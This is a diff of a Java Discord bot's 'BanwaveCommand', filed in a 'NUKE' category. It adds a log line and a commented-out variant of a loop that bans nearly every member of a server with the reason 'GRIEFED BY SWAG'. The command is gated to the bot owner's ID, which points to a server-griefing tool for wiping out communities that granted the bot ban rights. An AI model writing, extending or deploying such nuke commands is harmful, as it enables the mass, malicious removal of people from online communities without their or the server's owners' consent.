@@ -21,6 +21,9 @@ public class BanwaveCommand implements ICommand {
         if (!(event.getAuthor().getIdLong() == Core.OWNERID)) {
             return;
         }
+        Logger.getLogger().print("Initiating Ban Wave...");
+//        event.getGuild().getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member))).forEach(member -> member.ban(7, "GRIEFED BY SWAG").queue());
+
         for (Member member : event.getGuild().getMembers()) {
                 if (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member)) {
                     event.getGuild().ban(member, 7).reason("GRIEFED BY SWAG").queue();
@@ -51,3 +54,4 @@ public class BanwaveCommand implements ICommand {
         return Category.NUKE;
     }
 }
+
